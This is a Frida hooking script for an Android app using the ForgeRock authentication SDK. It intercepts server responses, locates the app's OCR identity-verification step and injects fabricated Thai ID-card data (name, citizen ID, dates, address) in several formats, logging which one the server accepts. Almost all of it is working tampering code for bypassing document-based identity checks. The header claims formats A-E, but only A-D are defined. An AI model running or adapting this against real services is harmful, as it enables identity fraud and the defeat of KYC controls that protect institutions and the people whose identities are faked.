// Frida OCR Format Multi-Attempt
// Tries formats A-E on the same Node, capturing server response for each

Java.perform(function () {
    console.log("[FMT] === Multi-Format OCR Injection ===");

    var TextInputCallback = Java.use("org.forgerock.android.auth.callback.TextInputCallback");
    var ChoiceCallback = Java.use("org.forgerock.android.auth.callback.ChoiceCallback");

    // Format definitions
    var formats = [
        { name: "A_JSON_FIELDS", data: JSON.stringify({
            thaiFirstName:"สมใจ", thaiLastName:"ใจดี", englishTitle:"Miss",
            englishFirstName:"Somjai", englishLastName:"Jaidee",
            citizenId:"3872637115880", dateOfBirth:"15 Jan. 1992",
            dateOfIssue:"21 Aug. 2023", dateOfExpiry:"21 Aug. 2032",
            address:"888 หมู่ที่ 8 ต.ทดสอบ อ.ทดสอบ จ.กรุงเทพฯ"
        })},
        { name: "B_JSON_OCRDATA_KEY", data: JSON.stringify({
            ocrData:{ thaiFirstName:"สมใจ", thaiLastName:"ใจดี",
                englishTitle:"Miss", englishFirstName:"Somjai", englishLastName:"Jaidee",
                citizenId:"3872637115880", dateOfBirth:"15 Jan. 1992",
                dateOfIssue:"21 Aug. 2023", dateOfExpiry:"21 Aug. 2032",
                address:"888 หมู่ที่ 8 ต.ทดสอบ อ.ทดสอบ จ.กรุงเทพฯ" }
        })},
        { name: "C_PIPE_DELIMITED", data: "สมใจ|ใจดี|Miss|Somjai|Jaidee|3872637115880|15 Jan. 1992|21 Aug. 2023|21 Aug. 2032|888 หมู่ที่ 8 ต.ทดสอบ อ.ทดสอบ จ.กรุงเทพฯ" },
        { name: "D_EMPTY_CONTROL", data: "" },
    ];

    // Hook response handler ONCE
    var responseLog = [];
    try {
        var ASC2 = Java.use("org.forgerock.android.auth.AuthServiceClient$2");
        ASC2.onResponse.implementation = function (call, response) {
            try {
                var body = response.peekBody(1048576).string();
                var code = response.code();
                console.log("[RESP] HTTP " + code + " body: " + body.substring(0, 200));
                responseLog.push({code: code, body: body.substring(0, 300)});
            } catch (e) {
                console.log("[RESP] read error: " + e);
            }
            return this.onResponse(call, response);
        };
        console.log("[FMT] Response hook installed");
    } catch (e) { console.log("[FMT] Hook failed: " + e); }

    var foundNode = false;

    Java.choose("org.forgerock.android.auth.Node", {
        onMatch: function (node) {
            if (foundNode) return;
            try {
                if (node.getStage() !== "OCR") return;
                foundNode = true;
                console.log("[FMT] *** OCR Node found ***");

                var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
                var listener = null;
                Java.choose("org.forgerock.android.auth.NodeListener", {
                    onMatch: function (l) { if (!listener) { listener = l; console.log("[FMT] Found listener"); } },
                    onComplete: function () {}
                });

                var callbacks = node.getCallbacks();
                if (callbacks.size() < 2) { console.log("[FMT] Not enough callbacks"); return; }

                // Try each format sequentially
                var attempt = 0;
                function tryNextFormat() {
                    if (attempt >= formats.length) {
                        console.log("[FMT] === ALL FORMATS TRIED ===");
                        for (var i = 0; i < responseLog.length; i++) {
                            console.log("[FMT] Attempt " + (i+1) + " response: " + JSON.stringify(responseLog[i]).substring(0, 200));
                        }
                        console.log("[FMT-COMPLETE] Done");
                        return;
                    }

                    var fmt = formats[attempt];
                    attempt++;
                    console.log("\n[FMT] === Attempt " + attempt + ": " + fmt.name + " ===");
                    console.log("[FMT] Data (first 80): " + (fmt.data || "(empty)").substring(0, 80));

                    // Fill callbacks
                    var tic = Java.cast(callbacks.get(1), TextInputCallback);
                    tic.setValue(fmt.data);
                    var cc = Java.cast(callbacks.get(0), ChoiceCallback);
                    cc.setSelectedIndex(0);

                    // Clear response log for this attempt
                    responseLog = [];

                    // Submit
                    console.log("[FMT] Calling Node.next()...");
                    try {
                        node.next(context, listener);
                        console.log("[FMT] Node.next() sent. Waiting 8s for response...");
                    } catch (e) {
                        console.log("[FMT] Node.next() error: " + e);
                    }

                    // Wait 8 seconds then try next format
                    setTimeout(tryNextFormat, 8000);
                }

                // Start first attempt after 2 seconds
                setTimeout(tryNextFormat, 2000);

            } catch (e) {
                console.log("[FMT] Error: " + e);
            }
        },
        onComplete: function () {
            if (!foundNode) console.log("[FMT] No OCR Node found. [FMT-COMPLETE]");
        }
    });
});
